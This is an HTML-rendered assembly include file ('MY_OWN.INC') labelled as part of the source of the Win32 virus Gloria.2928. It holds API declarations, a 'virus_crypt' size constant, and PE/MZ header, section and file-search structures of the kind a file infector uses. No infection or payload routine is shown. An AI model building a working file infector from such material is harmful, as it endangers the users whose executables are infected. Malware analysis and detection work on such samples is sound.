<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win32.Gloria.2928 - MY_OWN.INC.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">

        </span><span class="sc5">one_minute</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">60000</span><span class="sc0">
        </span><span class="sc5">virus_crypt</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">file_data</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">area_crypt</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">
</span><span class="sc5">dummy</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">virus_crypt</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">filetime</span><span class="sc0">                </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">FT_dwLowDateTime</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FT_dwHighDateTime</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">filetime</span><span class="sc0">                </span><span class="sc9">ENDS</span><span class="sc0">
</span><span class="sc5">win32_find_data</span><span class="sc0">         </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">FileAttributes</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CreationTime</span><span class="sc0">            </span><span class="sc5">filetime</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">LastAccessTime</span><span class="sc0">          </span><span class="sc5">filetime</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">LastWriteTime</span><span class="sc0">           </span><span class="sc5">filetime</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FileSizeHigh</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FileSizeLow</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Reserved0</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Reserved1_</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FileName</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">AlternateFileName</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">win32_find_data</span><span class="sc0">         </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">peheader_find_data</span><span class="sc0">      </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">_pe</span><span class="sc0">                     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">_cpu</span><span class="sc0">                    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">_objects</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">_nt</span><span class="sc0">                     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">_entry</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">_image_base</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">_obj_ln</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">_file_ln</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">_img_sz</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">_header_sz</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">168</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">peheader_find_data</span><span class="sc0">      </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">section_pe_file</span><span class="sc0">         </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">_name_sec</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">_virtual_sz</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">            </span><span class="sc1">; SH_VirtualSize</span><span class="sc0">
</span><span class="sc5">_RVA</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">            </span><span class="sc1">; SH_VirtualAddress</span><span class="sc0">
</span><span class="sc5">_physical_sz</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">            </span><span class="sc1">; SH_SizeOfRawData</span><span class="sc0">
</span><span class="sc5">_physical_off</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">            </span><span class="sc1">; SH_PointerToRawData</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">_obj_flags</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">section_pe_file</span><span class="sc0">         </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">IMAGE_DOS_HEADER</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">           </span><span class="sc1">; DOS .EXE header</span><span class="sc0">
</span><span class="sc5">MZ_magic</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; Magic number</span><span class="sc0">
</span><span class="sc5">MZ_cblp</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; Bytes on last page of file</span><span class="sc0">
</span><span class="sc5">MZ_cp</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; Pages in file</span><span class="sc0">
</span><span class="sc5">MZ_crlc</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; Relocations</span><span class="sc0">
</span><span class="sc5">MZ_cparhdr</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; Size of header in paragraphs</span><span class="sc0">
</span><span class="sc5">MZ_minalloc</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; Minimum extra paragraphs needed</span><span class="sc0">
</span><span class="sc5">MZ_maxalloc</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; Maximum extra paragraphs needed</span><span class="sc0">
</span><span class="sc5">MZ_ss</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; Initial (relative) SS value</span><span class="sc0">
</span><span class="sc5">MZ_sp</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; Initial SP value</span><span class="sc0">
</span><span class="sc5">MZ_csum</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; Checksum</span><span class="sc0">
</span><span class="sc5">MZ_ip</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; Initial IP value</span><span class="sc0">
</span><span class="sc5">MZ_cs</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; Initial (relative) CS value</span><span class="sc0">
</span><span class="sc5">MZ_lfarlc</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; File address of relocation table</span><span class="sc0">
</span><span class="sc5">MZ_ovno</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; Overlay number</span><span class="sc0">
</span><span class="sc5">MZ_res</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">; Reserved words</span><span class="sc0">
</span><span class="sc5">MZ_oemid</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; OEM identifier (for MZ_oeminfo)</span><span class="sc0">
</span><span class="sc5">MZ_oeminfo</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; OEM information; MZ_oemid specific</span><span class="sc0">
</span><span class="sc5">MZ_res2</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Reserved words</span><span class="sc0">
</span><span class="sc5">MZ_lfanew</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; File address of new exe header</span><span class="sc0">
</span><span class="sc5">IMAGE_DOS_HEADER</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_DOS_HEADER_SIZE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_DOS_HEADER</span><span class="sc0">
                                 </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_FILE_HEADER</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">          </span><span class="sc1">; Portable Exe File</span><span class="sc0">
</span><span class="sc5">PE_Magic</span><span class="sc0">                 </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Machine</span><span class="sc0">                  </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">; Machine type</span><span class="sc0">
</span><span class="sc5">NumberOfSections</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">; Number of sections</span><span class="sc0">
</span><span class="sc5">TimeDateStamp</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">; Date and Time</span><span class="sc0">
</span><span class="sc5">PointerToSymbolTable</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">; Pointer to Symbols</span><span class="sc0">
</span><span class="sc5">NumberOfSymbols</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">; Number of Symbols</span><span class="sc0">
</span><span class="sc5">SizeOfOptionalHeader</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">; Size of Optional Header</span><span class="sc0">
</span><span class="sc5">Characteristics</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">; File characteristics</span><span class="sc0">
</span><span class="sc5">IMAGE_FILE_HEADER</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_FILE_HEADER_SIZE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_HEADER</span><span class="sc0">
                                 </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">       </span><span class="sc1">; Image data directory</span><span class="sc0">
</span><span class="sc5">DD_VirtualAddress</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">; Virtual address</span><span class="sc0">
</span><span class="sc5">DD_Size</span><span class="sc0">              </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">; Virtual size</span><span class="sc0">
</span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">        </span><span class="sc1">;;;;;;;;;</span><span class="sc0">
                                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_DIRECTORY_ENTRIES</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">            </span><span class="sc1">; All directories</span><span class="sc0">
</span><span class="sc5">DE_Export</span><span class="sc0">       </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DE_Import</span><span class="sc0">       </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DE_Resource</span><span class="sc0">     </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DE_Exception</span><span class="sc0">    </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DE_Security</span><span class="sc0">     </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DE_BaseReloc</span><span class="sc0">    </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DE_Debug</span><span class="sc0">        </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DE_Copyright</span><span class="sc0">    </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DE_GlobalPtr</span><span class="sc0">    </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DE_TLS</span><span class="sc0">          </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DE_LoadConfig</span><span class="sc0">   </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DE_BoundImport</span><span class="sc0">  </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DE_IAT</span><span class="sc0">          </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_DIRECTORY_ENTRIES</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_NUMBEROF_DIRECTORY_ENTRIES</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
                                         </span><span class="sc1">;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">IMAGE_OPTIONAL_HEADER</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">                        </span><span class="sc1">; Optional Header</span><span class="sc0">
</span><span class="sc5">OH_Magic</span><span class="sc0">                        </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Magic word</span><span class="sc0">
</span><span class="sc5">OH_MajorLinkerVersion</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Major Linker version</span><span class="sc0">
</span><span class="sc5">OH_MinorLinkerVersion</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Minor Linker version</span><span class="sc0">
</span><span class="sc5">OH_SizeOfCode</span><span class="sc0">                   </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Size of code section</span><span class="sc0">
</span><span class="sc5">OH_SizeOfInitializedData</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Initialized Data</span><span class="sc0">
</span><span class="sc5">OH_SizeOfUninitializedData</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Uninitialized Data</span><span class="sc0">
</span><span class="sc5">OH_AddressOfEntryPoint</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; Initial EIP</span><span class="sc0">
</span><span class="sc5">OH_BaseOfCode</span><span class="sc0">                   </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; Code Virtual Address</span><span class="sc0">
</span><span class="sc5">OH_BaseOfData</span><span class="sc0">                   </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; Data Virtual Address</span><span class="sc0">
</span><span class="sc5">OH_ImageBase</span><span class="sc0">                    </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; Base of image</span><span class="sc0">
</span><span class="sc5">OH_SectionAlignment</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Section Alignment</span><span class="sc0">
</span><span class="sc5">OH_FileAlignment</span><span class="sc0">                </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; File Alignment</span><span class="sc0">
</span><span class="sc5">OH_MajorOperatingSystemVersion</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Major OS</span><span class="sc0">
</span><span class="sc5">OH_MinorOperatingSystemVersion</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Minor OS</span><span class="sc0">
</span><span class="sc5">OH_MajorImageVersion</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Major Image version</span><span class="sc0">
</span><span class="sc5">OH_MinorImageVersion</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Minor Image version</span><span class="sc0">
</span><span class="sc5">OH_MajorSubsystemVersion</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Major Subsys version</span><span class="sc0">
</span><span class="sc5">OH_MinorSubsystemVersion</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Minor Subsys version</span><span class="sc0">
</span><span class="sc5">OH_Win32VersionValue</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; win32 version</span><span class="sc0">
</span><span class="sc5">OH_SizeOfImage</span><span class="sc0">                  </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Size of image</span><span class="sc0">
</span><span class="sc5">OH_SizeOfHeaders</span><span class="sc0">                </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Size of Header</span><span class="sc0">
</span><span class="sc5">OH_CheckSum</span><span class="sc0">                     </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; unused</span><span class="sc0">
</span><span class="sc5">OH_Subsystem</span><span class="sc0">                    </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Subsystem</span><span class="sc0">
</span><span class="sc5">OH_DllCharacteristics</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; DLL characteristic</span><span class="sc0">
</span><span class="sc5">OH_SizeOfStackReserve</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Stack reserve</span><span class="sc0">
</span><span class="sc5">OH_SizeOfStackCommit</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Stack commit</span><span class="sc0">
</span><span class="sc5">OH_SizeOfHeapReserve</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Heap reserve</span><span class="sc0">
</span><span class="sc5">OH_SizeOfHeapCommit</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Heap commit</span><span class="sc0">
</span><span class="sc5">OH_LoaderFlags</span><span class="sc0">                  </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Loader flags</span><span class="sc0">
</span><span class="sc5">OH_NumberOfRvaAndSizes</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Number of directories</span><span class="sc0">
                                </span><span class="sc9">UNION</span><span class="sc0">          </span><span class="sc1">; directory entries</span><span class="sc0">
</span><span class="sc5">OH_DataDirectory</span><span class="sc0">                </span><span class="sc5">IMAGE_DATA_DIRECTORY\
</span><span class="sc0">                                </span><span class="sc5">IMAGE_NUMBEROF_DIRECTORY_ENTRIES</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OH_DirectoryEntries</span><span class="sc0">             </span><span class="sc5">IMAGE_DIRECTORY_ENTRIES</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
                                </span><span class="sc9">ENDS</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_OPTIONAL_HEADER</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_OPTIONAL_HEADER_SIZE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_OPTIONAL_HEADER</span><span class="sc0">
                                               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">                     </span><span class="sc1">; Section hdr.</span><span class="sc0">
</span><span class="sc5">SH_Name</span><span class="sc0">                 </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">            </span><span class="sc1">; name</span><span class="sc0">
                        </span><span class="sc9">UNION</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">SH_PhysicalAddress</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">          </span><span class="sc1">; Physical address</span><span class="sc0">
</span><span class="sc5">SH_VirtualSize</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; Virtual size</span><span class="sc0">
                        </span><span class="sc9">ENDS</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
